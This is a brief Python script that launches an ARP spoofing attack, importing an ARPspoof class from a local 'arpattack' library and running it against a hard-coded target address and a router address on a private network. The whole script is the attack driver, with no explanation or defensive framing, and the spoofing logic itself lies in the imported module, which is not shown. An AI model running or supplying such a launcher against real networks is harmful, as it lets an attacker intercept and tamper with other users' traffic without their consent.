# !/usr/bin/env python
from libs.arpattack import ARPspoof

# define global variables
TARGET_IP = "192.168.1.54"
ROUTER_IP = "192.168.1.1"

arp_spoofer = ARPspoof(TARGET_IP, ROUTER_IP)
arp_spoofer.run()